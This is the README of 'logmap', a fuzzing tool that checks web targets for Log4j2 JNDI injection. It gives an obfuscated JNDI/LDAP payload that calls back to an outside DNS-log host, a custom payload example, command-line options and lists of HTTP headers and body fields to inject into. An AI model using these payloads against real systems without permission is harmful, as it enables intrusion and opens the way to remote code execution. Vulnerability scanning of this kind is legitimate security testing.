# logmap - Log4j2 jndi injection fuzz tool

Used for fuzzing to test whether there are log4j2 jndi injection vulnerabilities in header/body/path  
Use https://log.xn--9tr.com dnslog by default, If you want to use http://ceye.io, you need to modify the domain and token  
Manually edit line [#373](https://github.com/zhzyker/logmap/blob/main/logmap.py#L373) in logmap.py to modify:  
`args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]`  
to   
`args.ceye = ["1234567.ceye.io", "843fd6d58a8ebede756a2b991d321a5a"]`  

The default payload is `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DNS_LOG_DOMAIN/a}` You can customize at will, in line [#283](https://github.com/zhzyker/logmap/blob/main/logmap.py#L283)  

This is just a jndi injection fuzz tool, rce or others need yourself

# Use  
```bash
zhzy@debian:~/$ pip3 install -r requirements.txt
zhzy@debian:~/$ python3 logmap.py -h
```


![banner](https://user-images.githubusercontent.com/32918050/145970843-3d5522f6-0064-4464-b7f8-48efcd41ffbc.png)  

# Options
```bash
  -u URL, --url URL     Target URL (e.g. http://example.com )
  -f FILE, --file FILE  Select a target list file (e.g. list.txt )
  -d 1, --dns 1         Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1
  -p PAYLOAD            Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} )
  -t 10                 Http timeout default 10s
  --proxy PROXY         Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)
  -h, --help            Show this help message and exit

```

# Config  
There are currently 95 fuzz headers  
```
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Ali-CDN-Real-IP
Authorization
Cache-Control
Cdn-Real-Ip
Cdn-Src-Ip
CF-Connecting-IP
Client-IP
Contact
Cookie
DNT
Fastly-Client-Ip
Forwarded-For-Ip
Forwarded-For
Forwarded
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Originating-Ip
Origin
Pragma
Proxy-Client-IP
Proxy
Referer
TE
True-Client-Ip
True-Client-IP
Upgrade
User-Agent
Via
Warning
WL-Proxy-Client-IP
X-Api-Version
X-Att-Deviceid
X-ATT-DeviceId
X-Client-IP
X-Client-Ip
X-Client-IP
X-Cluster-Client-IP
X-Correlation-ID
X-Csrf-Token
X-CSRFToken
X-Do-Not-Track
X-Foo-Bar
X-Foo
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-For
X-Forwarded-Host
X-Forwarded
X-Forwarded-Port
X-Forwarded-Protocol
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Forward-For
X-Forward-Proto
X-Frame-Options
X-From
X-Geoip-Country
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method-Override
X-HTTP-Method-Override
X-Http-Method
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Original-URL
X-Originating-IP
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-IP
X-Requested-With
X-Request-ID
X-True-IP
X-UIDH
X-Wap-Profile
X-WAP-Profile
X-XSRF-TOKEN
```
Some body and path  
You can also modify him to add your own body  
```
payload={}
user={}
pass={}
username={}
password={}
login={}
... ...
?id={}
?username={}
... ...
```
